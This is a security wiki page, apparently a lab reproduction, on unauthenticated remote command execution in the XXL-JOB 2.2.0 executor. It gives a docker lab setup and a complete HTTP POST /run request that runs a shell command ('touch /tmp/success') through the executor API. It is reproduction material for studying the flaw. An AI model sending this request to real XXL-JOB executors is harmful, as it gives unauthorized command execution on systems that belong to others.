<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/XXL-JOB/unacc/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>XXL-JOB Executor Unauthorized Access - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "XXL-JOB Executor Unauthorized Access", url: "#_top", children: [
              {title: "Environment Setup", url: "#environment-setup" },
              {title: "Vulnerability Reproduction", url: "#vulnerability-reproduction" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        XXL-JOB executor 未授权访问漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../XXL-JOB%E9%BB%98%E8%AE%A4accessToken%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../XXL-JOB%E9%BB%98%E8%AE%A4accessToken%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        XXL JOB默认accessToken身份绕过漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="xxl-job-executor-unauthorized-access">XXL-JOB Executor Unauthorized Access<a class="headerlink" href="#xxl-job-executor-unauthorized-access" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>XXL-JOB is a distributed task scheduling platform with core design goals of rapid development, simple learning, lightweight, and easy extensibility. It is now open source and has been integrated into many companies' production lines, ready to use out of the box.</p>
<p>XXL-JOB is divided into two parts: admin and executor, where the former is the backend management page and the latter is the task execution client. The executor has no authentication configured by default, allowing unauthorized attackers to execute arbitrary commands through the RESTful API.</p>
<p>References:</p>
<ul>
<li><a href="https://mp.weixin.qq.com/s/jzXIVrEl0vbjZxI4xlUm-g">https://mp.weixin.qq.com/s/jzXIVrEl0vbjZxI4xlUm-g</a></li>
<li><a href="https://landgrey.me/blog/18/">https://landgrey.me/blog/18/</a></li>
<li><a href="https://github.com/OneSourceCat/XxlJob-Hessian-RCE">https://github.com/OneSourceCat/XxlJob-Hessian-RCE</a></li>
</ul>
<h2 id="environment-setup">Environment Setup<a class="headerlink" href="#environment-setup" title="Permanent link">&para;</a></h2>
<p>Execute the following command to start XXL-JOB version 2.2.0:</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>After the environment is started, you can access the management end (admin) at <code>http://your-ip:8080</code> and the client end (executor) at <code>http://your-ip:9999</code>.</p>
<h2 id="vulnerability-reproduction">Vulnerability Reproduction<a class="headerlink" href="#vulnerability-reproduction" title="Permanent link">&para;</a></h2>
<p>Send the following data packet to the client (executor) to execute commands:</p>
<div class="highlight"><pre><span></span><code>POST /run HTTP/1.1
Host: your-ip:9999
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 365

{
  &quot;jobId&quot;: 1,
  &quot;executorHandler&quot;: &quot;demoJobHandler&quot;,
  &quot;executorParams&quot;: &quot;demoJobHandler&quot;,
  &quot;executorBlockStrategy&quot;: &quot;COVER_EARLY&quot;,
  &quot;executorTimeout&quot;: 0,
  &quot;logId&quot;: 1,
  &quot;logDateTime&quot;: 1586629003729,
  &quot;glueType&quot;: &quot;GLUE_SHELL&quot;,
  &quot;glueSource&quot;: &quot;touch /tmp/success&quot;,
  &quot;glueUpdatetime&quot;: 1586699003758,
  &quot;broadcastIndex&quot;: 0,
  &quot;broadcastTotal&quot;: 0
}
</code></pre></div>
<p><img alt="" src="1.png" /></p>
<p>The command <code>touch /tmp/success</code> has been successfully executed:</p>
<p><img alt="" src="2.png" /></p>
<p>Additionally, for XXL-JOB versions below 2.2.0 that don't have a RESTful API, we can execute commands through <a href="https://github.com/OneSourceCat/XxlJob-Hessian-RCE">Hessian deserialization</a>.</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        XXL-JOB executor 未授权访问漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../XXL-JOB%E9%BB%98%E8%AE%A4accessToken%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../XXL-JOB%E9%BB%98%E8%AE%A4accessToken%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        XXL JOB默认accessToken身份绕过漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>